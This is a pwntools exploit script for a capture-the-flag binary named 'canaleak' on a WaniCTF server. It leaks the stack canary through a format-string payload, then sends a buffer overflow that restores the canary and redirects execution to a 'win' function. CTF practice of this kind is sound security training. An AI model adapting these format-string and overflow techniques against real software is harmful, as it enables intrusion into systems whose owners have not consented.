#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("canaleak-pwn.wanictf.org", 9006)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+156
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# canaleak !!
payload = b"%9$p"

p.recvuntil(":")
p.sendline(payload)
p.recvuntil('\x20')
canary = eval(p.recvline().rstrip(b'\n'))
log.info("canary: " + hex(canary))

# overwrite
payload = b'A' * 0x8 * 3
payload += p64(canary)
payload += p64(0xdeadbeefcafebabe)
payload += p64(0x00401384)# for movaps
payload += p64(elf.symbols['win'])

p.recvuntil(":")
p.sendline(payload)

# agree
p.sendlineafter(':', "YES")

p.interactive()
